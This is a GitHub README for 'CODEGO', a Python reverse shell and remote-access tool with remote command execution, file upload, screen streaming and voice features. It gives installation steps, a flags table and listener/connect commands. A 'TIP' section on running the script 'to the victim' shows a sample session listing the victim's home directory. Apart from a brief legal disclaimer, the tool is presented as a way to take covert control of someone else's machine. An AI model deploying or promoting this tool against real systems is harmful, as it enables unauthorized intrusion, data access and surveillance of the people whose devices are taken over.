# 🎯 CODEGO: The Swiss Army Knife for Network Utility Tools

![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge)
![Status](https://img.shields.io/badge/status-active-brightgreen?style=for-the-badge)
![License](https://img.shields.io/badge/license-MIT-red?style=for-the-badge)

> ⚠️ **This tool is for educational purposes and authorized testing only. Unauthorized use is illegal.**

**CODEGO** is an all-in-one ethical hacking and remote administration tool. Designed for advanced users, it provides functionality for reverse shell, command execution, file uploading, screen sharing, and even real-time voice communication — all wrapped in a sleek terminal interface with ASCII art.

---

## 🚀 Features

- 📡 **Reverse Shell** — Establish terminal access to a remote machine
- 🖥️ **Screen Sharing** — Share or receive desktop streams (`vidstream`)
- 🎙️ **Voice Call** — Real-time audio communication (`pyaudio`)
- 📂 **File Upload** — Upload and save files to a remote machine
- 🧠 **Interactive Shell** — Execute commands on the fly
- 🧰 **Custom Execution** — Auto-execute scripts or binaries on connection
- 🌌 **Stylized UI** — Includes custom ASCII art for branding

---

## 🛠️ Installation

```bash
pip install -r requirements.txt
```

> Requires **Python 3.6+**

1. Clone the repo:

```bash
git clone https://github.com/LaVenganzaDelLadron/reverseShell.git
cd reverseShell
```
2. usage

| Short | Long        | Description                                 |
| ----- | ----------- | ------------------------------------------- |
| `-l`  | `--listen`  | Listen for incoming connections             |
| `-e`  | `--execute` | Execute a specified command/file on connect |
| `-c`  | `--command` | Launch an interactive command shell         |
| `-u`  | `--upload`  | Upload a file to destination                |
| `-s`  | `--stream`  | Start screen sharing session                |
| `-a`  | `--audio`   | Start a voice call session                  |
| `-t`  | `--target`  | Target IP address                           |
| `-p`  | `--port`    | Port number to use                          |


3. Run the codego
```bash
python3 codego.py -t <target_ip> -p <port> [options]
```

##Examples
```bash
python3 codego.py -l -p 4444 -c
```
```bash
python3 codego.py -t 192.168.1.5 -p 4444
```
##Screen Sharing

```bash
python3 codego.py -l -p 8080 -s
```
```bash
python3 codego.py -t 192.168.1.5 -p 4444
```
##🎧 Voice Call

Receiver:
```bash
python3 codego.py -l -p 5555 -a
```
Caller:
```bash
python3 codego.py -t 192.168.1.5 -p 5555 -a
```

##🧑‍⚖️ Legal Disclaimer

This project is for educational and authorized penetration testing only.
Using it without proper consent is illegal. You are responsible for your actions.

##TIP

You can also create a file or run this script to the victim using
```bash
python3 codego.py -l -p 4444 -c
```
and you will connect to the victim device:
```bash
python3 codego.py -t 192.168.1.5 -p 4444
```

it will prompt this:
```bash
▓█████▄  ▄▄▄       ██▀███   ██ ▄█▀  ▄████  ██▓     ██▓▄▄▄█████▓ ▄████▄   ██░ ██ 
▒██▀ ██▌▒████▄    ▓██ ▒ ██▒ ██▄█▒  ██▒ ▀█▒▓██▒    ▓██▒▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒
░██   █▌▒██  ▀█▄  ▓██ ░▄█ ▒▓███▄░ ▒██░▄▄▄░▒██░    ▒██▒▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░
░▓█▄   ▌░██▄▄▄▄██ ▒██▀▀█▄  ▓██ █▄ ░▓█  ██▓▒██░    ░██░░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██ 
░▒████▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒ █▄░▒▓███▀▒░██████▒░██░  ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒▓ ░▒▓░▒ ▒▒ ▓▒ ░▒   ▒ ░ ▒░▓  ░░▓    ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒
 ░ ▒  ▒   ▒   ▒▒ ░  ░▒ ░ ▒░░ ░▒ ▒░  ░   ░ ░ ░ ▒  ░ ▒ ░    ░      ░  ▒    ▒ ░▒░ ░
 ░ ░  ░   ░   ▒     ░░   ░ ░ ░░ ░ ░ ░   ░   ░ ░    ▒ ░  ░      ░         ░  ░░ ░
   ░          ░  ░   ░     ░  ░         ░     ░  ░ ░           ░ ░       ░  ░  ░
 ░                                                             ░                


[>] Connecting to 192.168.1.11:4444
[$] Connected
<Command:> ls
Android
clientDeauth
codingIsLife
Crossword
Desktop
Documents
Downloads
Music
NetBeansProjects
Pictures
Public
PycharmProjects
saycheese
snap
Templates
Videos
```
then find the script of codego and run here:


